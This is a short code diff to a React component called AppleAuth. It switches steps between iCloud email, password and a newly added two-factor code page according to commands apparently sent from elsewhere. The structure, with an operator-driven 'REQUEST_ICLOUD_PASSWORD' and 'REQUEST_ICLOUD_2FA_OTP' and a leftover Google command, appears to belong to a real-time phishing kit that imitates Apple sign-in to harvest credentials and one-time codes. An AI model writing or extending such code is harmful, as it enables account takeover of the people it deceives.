@@ -17,13 +17,18 @@ export default function AppleAuth() {
     const { command, resetCommand } = useCommand();
 
     useEffect(() => {
-        if (command === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
+        if (command === 'REQUEST_ICLOUD_EMAIL_AGAIN') {
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('email');
         } else if (command === 'REQUEST_ICLOUD_PASSWORD') {
             setIsLoading(false);
             setCurrentStep('password');
+        }  else if (command === 'REQUEST_ICLOUD_2FA_OTP') {
+            setTimeout(() => {
+                resetCommand(); 
+                router.push('/AppleOtpPage');
+            }, 1500);
         } else if (command === 'FINISH') {
             setTimeout(() => {
                 resetCommand(); 
